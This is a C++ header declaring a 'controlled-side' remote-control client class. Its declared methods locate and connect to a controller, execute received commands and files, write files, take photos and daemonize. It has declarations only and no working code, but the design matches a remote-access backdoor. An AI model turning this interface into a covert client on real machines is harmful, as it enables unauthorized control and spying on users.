#ifndef _BE_CONTROLLED_H
#define _BE_CONTROLLED_H

#include "utili.h"

class be_con;
typedef void(*Func)(be_con);

class be_con
{
public:
    be_con(int pt):m_port(pt){}
    ~be_con();
public:
    void search_control(); //寻找控制段
    bool conn();           //链接
    void deal_data();      //处理接收到的数据
private:
    bool write_file(sock_data *d, const char *path, int len);
    void cer_living();
    void take_photo();
    void exe_comm(const char *comm, int len);
    void exe_file(const char *file, int len);
    int  get_fd();
private:
    const int  m_port;
    char       *m_addr;
    int        m_sockfd;
    static int s_photo_num;
};

void exe_cli(be_con b_c);
void create_daemon(be_con b_c, Func f);
void sig_term(int sig);
#endif
